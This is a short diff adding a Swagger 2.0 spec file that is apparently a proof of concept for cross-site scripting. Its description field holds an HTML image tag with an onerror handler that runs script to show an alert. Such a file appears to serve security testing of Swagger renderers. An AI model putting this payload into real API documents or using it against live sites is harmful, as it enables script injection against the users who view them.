@@ -1,0 +1,13 @@
+swagger: "2.0"
+info:
+  title: Theeherbie Swagger XSS PoC
+  version: "1.0"
+  description: "<img src=x onerror=alert(document.domain)>"
+
+paths:
+  /test:
+    get:
+      summary: XSS test
+      responses:
+        200:
+          description: OK
